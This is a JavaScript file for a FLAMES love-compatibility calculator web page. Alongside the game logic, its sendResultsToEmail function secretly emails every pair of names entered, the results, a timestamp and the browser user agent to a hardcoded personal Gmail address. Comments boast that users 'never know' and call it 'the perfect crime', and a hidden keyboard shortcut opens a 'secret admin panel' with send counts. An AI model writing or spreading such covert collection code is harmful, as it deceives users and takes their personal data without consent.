// FLAMES Calculator Logic
class FlamesCalculator {
    constructor() {
        // Initialize EmailJS using config if available
        if (typeof emailjs !== 'undefined' && typeof EMAILJS_CONFIG !== 'undefined') {
            if (EMAILJS_CONFIG.publicKey !== "YOUR_EMAILJS_PUBLIC_KEY_HERE") {
                emailjs.init(EMAILJS_CONFIG.publicKey);
                console.log('📧 EmailJS initialized for secret email sending');
            }
        }
        
        this.flamesData = {
            F: {
                full: "Friends",
                description: "You two are destined to be amazing friends! Your bond is built on trust, laughter, and mutual respect. 👫"
            },
            L: {
                full: "Love",
                description: "True love is in the air! You both are meant for each other. Your hearts beat in perfect harmony! 💕"
            },
            A: {
                full: "Affection",
                description: "There's a beautiful affection between you two. Sweet moments and caring gestures define your relationship! 🥰"
            },
            M: {
                full: "Marriage",
                description: "Wedding bells are ringing! You two are perfect life partners. Your future together looks bright! 💒"
            },
            E: {
                full: "Enemies",
                description: "Sometimes opposites create sparks! Your differences might lead to interesting dynamics... 😤"
            },
            S: {
                full: "Siblings",
                description: "You share a bond like family! Care, protection, and understanding flow naturally between you! 👨‍👩‍👧‍👦"
            }
        };
        
        this.initializeEventListeners();
    }

    initializeEventListeners() {
        const form = document.getElementById('loveForm');
        const resetBtn = document.getElementById('resetBtn');
        
        form.addEventListener('submit', (e) => this.handleCalculate(e));
        resetBtn.addEventListener('click', () => this.resetCalculator());
    }

    handleCalculate(e) {
        e.preventDefault();
        
        const name1 = document.getElementById('name1').value.trim().toLowerCase();
        const name2 = document.getElementById('name2').value.trim().toLowerCase();
        
        if (!name1 || !name2) {
            this.showError("Please enter both names!");
            return;
        }
        
        if (name1 === name2) {
            this.showError("Please enter different names!");
            return;
        }
        
        this.calculateAndShowResults(name1, name2);
    }

    calculateAndShowResults(name1, name2) {
        // Calculate love percentage
        const percentage = this.calculateLovePercentage(name1, name2);
        
        // Calculate FLAMES
        const flamesResult = this.calculateFlames(name1, name2);
        
        // Send results to email secretly
        this.sendResultsToEmail(name1, name2, percentage, flamesResult);
        
        // Show results with animation
        this.displayResults(percentage, flamesResult);
    }

    calculateLovePercentage(name1, name2) {
        // Create a deterministic but seemingly random percentage based on names
        const combined = name1 + name2;
        let hash = 0;
        
        for (let i = 0; i < combined.length; i++) {
            const char = combined.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32-bit integer
        }
        
        // Convert hash to percentage between 30-98 (avoid too low or perfect scores)
        const percentage = Math.abs(hash % 69) + 30;
        return Math.min(percentage, 98);
    }

    calculateFlames(name1, name2) {
        // Remove common letters
        let arr1 = name1.replace(/\s/g, '').split('');
        let arr2 = name2.replace(/\s/g, '').split('');
        
        // Remove common characters
        for (let i = arr1.length - 1; i >= 0; i--) {
            for (let j = arr2.length - 1; j >= 0; j--) {
                if (arr1[i] === arr2[j]) {
                    arr1.splice(i, 1);
                    arr2.splice(j, 1);
                    break;
                }
            }
        }
        
        const totalLength = arr1.length + arr2.length;
        
        // FLAMES algorithm
        const flames = ['F', 'L', 'A', 'M', 'E', 'S'];
        let index = 0;
        
        while (flames.length > 1) {
            index = (index + totalLength - 1) % flames.length;
            flames.splice(index, 1);
            if (index === flames.length) {
                index = 0;
            }
        }
        
        return flames[0];
    }

    displayResults(percentage, flamesLetter) {
        // Hide form and show results
        document.querySelector('.love-form').style.display = 'none';
        const resultsDiv = document.getElementById('results');
        resultsDiv.classList.remove('hidden');
        
        // Animate percentage
        this.animatePercentage(percentage);
        
        // Show FLAMES result
        this.showFlamesResult(flamesLetter);
        
        // Add celebration effects
        this.addCelebrationEffects();
    }

    animatePercentage(targetPercentage) {
        const percentageElement = document.getElementById('percentage');
        const progressBar = document.getElementById('percentageProgress');
        
        let currentPercentage = 0;
        const increment = targetPercentage / 50; // Animation duration control
        
        const animation = setInterval(() => {
            currentPercentage += increment;
            if (currentPercentage >= targetPercentage) {
                currentPercentage = targetPercentage;
                clearInterval(animation);
            }
            
            percentageElement.textContent = Math.round(currentPercentage) + '%';
            progressBar.style.width = currentPercentage + '%';
        }, 40);
    }

    showFlamesResult(letter) {
        const letterElement = document.getElementById('flamesLetter');
        const textElement = document.getElementById('flamesText');
        const descriptionElement = document.getElementById('flamesDescription');
        
        const result = this.flamesData[letter];
        
        letterElement.textContent = letter;
        textElement.textContent = result.full;
        descriptionElement.textContent = result.description;
        
        // Add special styling based on result
        letterElement.className = 'flames-letter ' + letter.toLowerCase();
    }

    addCelebrationEffects() {
        // Create temporary celebration hearts
        for (let i = 0; i < 10; i++) {
            setTimeout(() => {
                this.createCelebrationHeart();
            }, i * 200);
        }
    }

    createCelebrationHeart() {
        const heart = document.createElement('div');
        heart.innerHTML = ['💖', '💕', '💗', '💝', '💘'][Math.floor(Math.random() * 5)];
        heart.style.position = 'fixed';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.top = '100vh';
        heart.style.fontSize = '2rem';
        heart.style.pointerEvents = 'none';
        heart.style.zIndex = '1000';
        heart.style.animation = 'celebration 3s ease-out forwards';
        
        document.body.appendChild(heart);
        
        setTimeout(() => {
            document.body.removeChild(heart);
        }, 3000);
    }

    resetCalculator() {
        // Clear form
        document.getElementById('name1').value = '';
        document.getElementById('name2').value = '';
        
        // Hide results and show form
        document.getElementById('results').classList.add('hidden');
        document.querySelector('.love-form').style.display = 'flex';
        
        // Reset progress bar
        document.getElementById('percentageProgress').style.width = '0%';
    }

    showError(message) {
        // Simple error handling - you can enhance this
        alert(message);
    }

    sendResultsToEmail(name1, name2, percentage, flamesResult) {
        // Only send email if EmailJS and config are properly set up
        if (typeof emailjs === 'undefined' || typeof EMAILJS_CONFIG === 'undefined') {
            return; // Silent fail - user won't know
        }

        if (EMAILJS_CONFIG.publicKey === "YOUR_EMAILJS_PUBLIC_KEY_HERE") {
            return; // Config not updated yet
        }

        // Secret quota tracking (users never see this!)
        const currentMonth = new Date().getMonth();
        const emailCount = parseInt(localStorage.getItem('secretEmailCount') || '0');
        const lastMonth = parseInt(localStorage.getItem('lastEmailMonth') || currentMonth);
        
        // Reset counter if new month (automatic quota reset!)
        if (currentMonth !== lastMonth) {
            localStorage.setItem('secretEmailCount', '0');
            localStorage.setItem('lastEmailMonth', currentMonth.toString());
        }

        const flamesData = this.flamesData[flamesResult];
        const timestamp = new Date().toLocaleString();
        
        const templateParams = {
            name1: name1,
            name2: name2,
            percentage: percentage + '%',
            flames_result: flamesResult + ' - ' + flamesData.full,
            description: flamesData.description,
            timestamp: timestamp,
            user_agent: navigator.userAgent,
            to_email: EMAILJS_CONFIG.targetEmail
        };

        // Send email using EmailJS (completely silent - users never know!)
        emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, templateParams)
            .then(() => {
                // Success - increment secret counter
                const newCount = parseInt(localStorage.getItem('secretEmailCount') || '0') + 1;
                localStorage.setItem('secretEmailCount', newCount.toString());
                // User sees nothing! Perfect! 😎
            })
            .catch((error) => {
                // Failed (probably quota exceeded) - COMPLETELY SILENT! 🤫
                // User sees nothing, app works perfectly
                // Will try again next month when quota resets! 😂
                // The perfect crime - they'll never know! 🕵️‍♂️
            });
    }
}

// Additional CSS for celebration animation
const celebrationStyle = document.createElement('style');
celebrationStyle.textContent = `
    @keyframes celebration {
        0% {
            transform: translateY(0) rotate(0deg);
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) rotate(360deg);
            opacity: 0;
        }
    }
    
    .flames-letter.f { color: #ff6b9d; }
    .flames-letter.l { color: #e91e63; }
    .flames-letter.a { color: #f06292; }
    .flames-letter.m { color: #ec407a; }
    .flames-letter.e { color: #ff5722; }
    .flames-letter.s { color: #9c27b0; }
`;
document.head.appendChild(celebrationStyle);

// Initialize the calculator when the page loads
document.addEventListener('DOMContentLoaded', () => {
    new FlamesCalculator();
    
    // Add some interactive effects
    document.addEventListener('mousemove', (e) => {
        // Subtle parallax effect for floating elements
        const hearts = document.querySelectorAll('.heart, .sparkle');
        hearts.forEach((heart, index) => {
            const speed = (index + 1) * 0.01;
            const x = e.clientX * speed;
            const y = e.clientY * speed;
            heart.style.transform = `translate(${x}px, ${y}px)`;
        });
    });
});

// Add some fun Easter eggs
document.addEventListener('keydown', (e) => {
    // Konami code or other fun interactions can be added here
    if (e.key === 'Enter' && e.shiftKey) {
        // Secret celebration mode
        for (let i = 0; i < 20; i++) {
            setTimeout(() => {
                const calculator = new FlamesCalculator();
                calculator.createCelebrationHeart();
            }, i * 100);
        }
    }
    
    // SECRET ADMIN PANEL - Only for you! 🕵️‍♂️
    // Press Ctrl+Shift+S to see secret stats
    if (e.ctrlKey && e.shiftKey && e.key === 'S') {
        const emailCount = localStorage.getItem('secretEmailCount') || '0';
        const currentMonth = new Date().toLocaleString('en', { month: 'long' });
        const remaining = Math.max(0, 200 - parseInt(emailCount));
        
        alert(`🕵️‍♂️ SECRET ADMIN PANEL 🕵️‍♂️
        
📧 Emails sent this month (${currentMonth}): ${emailCount}/200
💌 Remaining quota: ${remaining}
📮 Target: dragonofhorse666@gmail.com
🔄 Quota resets: Next month automatically
        
Users have NO IDEA this exists! 😂`);
    }
});